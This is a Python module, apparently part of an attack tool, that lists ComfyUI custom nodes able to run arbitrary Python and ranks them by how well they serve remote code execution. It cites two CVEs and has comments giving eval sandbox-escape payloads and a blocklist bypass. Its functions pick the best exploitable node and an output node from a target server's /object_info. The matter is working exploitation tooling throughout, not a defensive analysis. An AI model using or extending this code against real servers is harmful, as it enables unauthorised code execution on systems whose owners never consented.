"""
Comprehensive database of ComfyUI custom nodes capable of executing
arbitrary Python code, plus text-output nodes for wiring results.

Each entry is discovered at runtime via /object_info — the database
provides the fallback field names and wrapping strategy when the live
schema isn't available yet.

Sources:
  - Direct CVEs (CVE-2024-21576, CVE-2024-21577)
  - Snyk Labs research (Dec 2024)
  - ComfyUI Jan 2025 security update (eval/exec ban rollout)
  - comfyai.run node documentation
  - GitHub repos: srl-nodes, AlekPet, mozhaa, christian-byrne, GreenLandisaLie,
    fabioamigo, jags111, hay86, pythongosssss, invAIder, zopi, basenc, NodeGPT,
    SeedV, ADIC, et_scripting, ComfyUI-AI_Tools, As_ComfyUI_CustomNodes,
    al-swaiti (OllamaGemini), Bmad
"""

from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class ExecNodeDef:
    """Definition of a code-execution node."""
    class_types: list[str]
    code_field: str
    extra_fields: dict = field(default_factory=dict)
    code_wrapper: str = "result"      # "return", "result", "print", "function", "text1", "eval"
    priority: int = 99
    needs_output_node: bool = True
    sandboxed: bool = False
    output_slot: int = 0


@dataclass
class OutputNodeDef:
    """Definition of a text-display node we can wire exec output into."""
    class_types: list[str]
    input_field: str
    priority: int = 99
    accepts_any: bool = False


# ─── Execution nodes, ordered by priority (1 = best) ─────────────────
#
# Priority tiers:
#   1-5   = Full unrestricted exec(), best nodes
#   6-15  = Exec/eval with quirks, function wrappers, unusual output vars
#   16-25 = Eval-based nodes (expression eval, limited but exploitable)
#   26-35 = SimpleEval / sandboxed eval (breakout possible via builtins)
#   90+   = Heavily sandboxed, last resort

EXEC_NODES: list[ExecNodeDef] = [

    # ── Tier 1: Full exec(), unrestricted ─────────────────────────────

    ExecNodeDef(
        class_types=["SRL Eval", "SrlEval"],
        code_field="code",
        extra_fields={"parameters": ""},
        code_wrapper="return",
        priority=1,
    ),
    ExecNodeDef(
        class_types=["IDENode"],
        code_field="pycode",
        extra_fields={"language": "python"},
        code_wrapper="result",
        priority=2,
    ),
    ExecNodeDef(
        class_types=["NotebookCell"],
        code_field="code",
        extra_fields={"language": "python"},
        code_wrapper="print",
        priority=3,
        needs_output_node=False,
    ),
    ExecNodeDef(
        class_types=["ExecutePython"],
        code_field="python_code",
        extra_fields={},
        code_wrapper="result",
        priority=4,
    ),
    ExecNodeDef(
        class_types=["PyExec"],
        code_field="pycode",
        extra_fields={},
        code_wrapper="result",
        priority=5,
    ),

    # ── Tier 2: Full exec() with quirks ───────────────────────────────

    ExecNodeDef(
        class_types=["NodePython", "NodePythonExecutor"],
        code_field="code",
        extra_fields={},
        code_wrapper="text1",
        priority=6,
    ),
    ExecNodeDef(
        class_types=["RunPython"],
        code_field="script",
        extra_fields={},
        code_wrapper="function",
        priority=7,
    ),
    ExecNodeDef(
        # christian-byrne/python-interpreter-node
        # class_type is "Exec Python Code Script"
        class_types=["Exec Python Code Script", "PythonInterpreter"],
        code_field="raw_code",
        extra_fields={},
        code_wrapper="print",
        priority=8,
        needs_output_node=False,
    ),
    ExecNodeDef(
        class_types=["Script"],
        code_field="script",
        extra_fields={},
        code_wrapper="result",
        priority=9,
    ),
    ExecNodeDef(
        class_types=["AdvancedScript"],
        code_field="script",
        extra_fields={},
        code_wrapper="result",
        priority=10,
    ),
    ExecNodeDef(
        class_types=["ExecutePythonNode"],
        code_field="python_code",
        extra_fields={},
        code_wrapper="result",
        priority=11,
    ),
    ExecNodeDef(
        class_types=["PythonCodeExecutor"],
        code_field="code",
        extra_fields={"safe_mode": False},
        code_wrapper="result",
        priority=12,
    ),
    ExecNodeDef(
        class_types=["script.py"],
        code_field="script",
        extra_fields={},
        code_wrapper="result",
        priority=13,
    ),
    ExecNodeDef(
        # GreenLandisaLie/ComfyUI-RunPythonCode
        # Default class_type uses SILVER prefix; some installs strip it
        class_types=[
            "SILVER.SilverRunPythonCode",
            "SilverRunPythonCode",
            "RunPythonCode",
        ],
        code_field="code",
        extra_fields={},
        code_wrapper="print",
        priority=14,
        needs_output_node=False,
    ),
    ExecNodeDef(
        # fabioamigo/ComfyUI-DockerSandbox — runs inside Docker but
        # on servers where it's installed, the Docker socket is present
        class_types=["DockerSandboxRunner"],
        code_field="code",
        extra_fields={},
        code_wrapper="print",
        priority=15,
        needs_output_node=False,
    ),

    # ── Tier 3: eval()-based nodes ────────────────────────────────────
    # These use Python eval() on user input. Full RCE via builtins
    # traversal: __import__('os').system('cmd') or
    # [v('os').system('cmd') for k,v in ().__class__.__bases__[0].__subclasses__() ...]

    ExecNodeDef(
        # NodeGPT / Comfyui-Nodes-basenc: "Eval" node
        # Input field: "cmd" — raw eval()
        class_types=["Eval"],
        code_field="cmd",
        extra_fields={},
        code_wrapper="eval",
        priority=16,
    ),
    ExecNodeDef(
        # ComfyUI-zopi: EvalPython
        class_types=["EvalPython"],
        code_field="script",
        extra_fields={},
        code_wrapper="eval",
        priority=17,
    ),
    ExecNodeDef(
        # NodeGPT EVAL node — code field "Python"
        # Uses exec() with #Outputs: header
        class_types=["EVAL"],
        code_field="Python",
        extra_fields={},
        code_wrapper="result",
        priority=18,
    ),
    ExecNodeDef(
        # As_ComfyUI_CustomNodes: Eval_AS
        # Uses eval() on expression strings
        class_types=["Eval_AS"],
        code_field="int_prc",
        extra_fields={},
        code_wrapper="eval",
        priority=19,
    ),
    ExecNodeDef(
        # ComfyUI-invAIder-Nodes: "👾 Evaluate Anything"
        # eval() on python_expression with variables a, b, c
        class_types=["👾 Evaluate Anything"],
        code_field="python_expression",
        extra_fields={},
        code_wrapper="eval",
        priority=20,
    ),
    ExecNodeDef(
        # CVE-2024-21577 — ComfyUI-Ace-Nodes: ACE_ExpressionEval
        # Direct eval() on "value" field, no sanitization (CVSS 10.0)
        class_types=["ACE_ExpressionEval", "ACE_Expression_Eval"],
        code_field="value",
        extra_fields={},
        code_wrapper="eval",
        priority=21,
    ),
    ExecNodeDef(
        # AutogenCodeExecutor (ComfyUI-Autogen)
        # Executes code via LLM agent, but accepts direct code input
        class_types=["AutogenCodeExecutor"],
        code_field="code",
        extra_fields={},
        code_wrapper="print",
        priority=22,
        needs_output_node=False,
    ),
    ExecNodeDef(
        # al-swaiti/ComfyUI-OllamaGemini: MathExpressionNode
        # Uses eval() on expression input
        class_types=["MathExpressionNode"],
        code_field="expression",
        extra_fields={},
        code_wrapper="eval",
        priority=23,
    ),
    ExecNodeDef(
        # comfyui-extended: UtilityExpression
        # eval() on expression with variables a, b, c, d
        class_types=["UtilityExpression"],
        code_field="expression",
        extra_fields={},
        code_wrapper="eval",
        priority=24,
    ),

    # ── Tier 4: CVE nodes — eval() with broken sanitization ──────────
    # These attempt to block keywords but the blocklist is trivially bypassable

    ExecNodeDef(
        # CVE-2024-21576 — ComfyUI-Bmad-Nodes
        # eval() with broken prepare_text_for_eval sanitization
        # Bypass: use math module's __spec__.__init__.__builtins__ to get __import__
        class_types=["BuildColorRangeHSVAdvanced"],
        code_field="hue_exp",
        extra_fields={},
        code_wrapper="eval",
        priority=25,
    ),
    ExecNodeDef(
        # Same package, same vuln — FilterContour, FindContour
        class_types=["FilterContour", "FindContour"],
        code_field="key",
        extra_fields={},
        code_wrapper="eval",
        priority=26,
    ),

    # ── Tier 5: SimpleEval-based nodes ────────────────────────────────
    # These use the simpleeval library which restricts builtins, but
    # breakout is sometimes possible via string methods or f-strings

    ExecNodeDef(
        # jags111/efficiency-nodes-comfyui
        class_types=["Evaluate Integers"],
        code_field="python_expression",
        extra_fields={},
        code_wrapper="eval",
        priority=30,
        sandboxed=True,
    ),
    ExecNodeDef(
        class_types=["Evaluate Floats", "EvalFloats"],
        code_field="python_expression",
        extra_fields={},
        code_wrapper="eval",
        priority=31,
        sandboxed=True,
    ),
    ExecNodeDef(
        class_types=["Evaluate Strings"],
        code_field="python_expression",
        extra_fields={},
        code_wrapper="eval",
        priority=32,
        sandboxed=True,
    ),

    # ── Tier 99: Heavily sandboxed (math only, no breakout) ──────────

    ExecNodeDef(
        class_types=["MathExpression|pysssss"],
        code_field="expression",
        extra_fields={},
        code_wrapper="eval",
        priority=99,
        sandboxed=True,
    ),
]

# ─── Output / display nodes, ordered by priority ─────────────────────

OUTPUT_NODES: list[OutputNodeDef] = [
    OutputNodeDef(
        class_types=["ShowText|pysssss"],
        input_field="text",
        priority=1,
    ),
    OutputNodeDef(
        class_types=["PreviewTextNode"],
        input_field="text",
        priority=2,
    ),
    OutputNodeDef(
        # Built-in since recent ComfyUI
        class_types=["PreviewAny"],
        input_field="source",
        priority=3,
        accepts_any=True,
    ),
    OutputNodeDef(
        class_types=["TextPreview"],
        input_field="text",
        priority=4,
    ),
    OutputNodeDef(
        # fairy-root/ComfyUI-Show-Text
        class_types=["ShowText", "Show Text"],
        input_field="text",
        priority=5,
    ),
    OutputNodeDef(
        # Comfyui-SadTalker variant
        class_types=["SadTalkerShowText"],
        input_field="text",
        priority=6,
    ),
    OutputNodeDef(
        # WAS Node Suite debug text display
        class_types=["Text Parse Tokens", "WAS_Text_Parse_Tokens"],
        input_field="text",
        priority=7,
    ),
]


def find_exec_node(available: dict[str, dict]) -> tuple[ExecNodeDef | None, str | None]:
    """
    Given the /object_info dict, find the best available exec node.
    Returns (node_def, matched_class_type) or (None, None).
    """
    best: tuple[ExecNodeDef | None, str | None] = (None, None)
    for ndef in EXEC_NODES:
        if ndef.sandboxed:
            continue
        for ct in ndef.class_types:
            if ct in available:
                if best[0] is None or ndef.priority < best[0].priority:
                    best = (ndef, ct)
    return best


def find_output_node(available: dict[str, dict]) -> tuple[OutputNodeDef | None, str | None]:
    """
    Given the /object_info dict, find the best available output node.
    Returns (node_def, matched_class_type) or (None, None).
    """
    best: tuple[OutputNodeDef | None, str | None] = (None, None)
    for odef in OUTPUT_NODES:
        for ct in odef.class_types:
            if ct in available:
                if best[0] is None or odef.priority < best[0].priority:
                    best = (odef, ct)
    return best


def resolve_code_field(ndef: ExecNodeDef, live_schema: dict) -> str:
    """
    Determine the actual code field name from the live /object_info schema,
    falling back to the database default.
    """
    required = live_schema.get("input", {}).get("required", {})
    optional = live_schema.get("input", {}).get("optional", {})
    all_fields = {**required, **optional}

    if ndef.code_field in all_fields:
        return ndef.code_field

    code_like = [
        "code", "pycode", "python_code", "script", "expression",
        "raw_code", "cmd", "Python", "python_expression", "value",
        "hue_exp", "int_prc", "float_prc", "str_prc",
    ]
    for candidate in code_like:
        if candidate in all_fields:
            spec = all_fields[candidate]
            if isinstance(spec, list) and len(spec) >= 2:
                meta = spec[1] if isinstance(spec[1], dict) else {}
                if meta.get("multiline", False):
                    return candidate
            if isinstance(spec, list) and spec and spec[0] in ("STRING", "PYCODE"):
                return candidate

    return ndef.code_field


def resolve_output_field(odef: OutputNodeDef, live_schema: dict) -> str:
    """Determine actual input field name for the output node."""
    required = live_schema.get("input", {}).get("required", {})
    optional = live_schema.get("input", {}).get("optional", {})
    all_inputs = {**required, **optional}

    if odef.input_field in all_inputs:
        return odef.input_field
    for k in all_inputs:
        spec = all_inputs[k]
        if isinstance(spec, list) and spec and spec[0] == "STRING":
            return k
    return odef.input_field
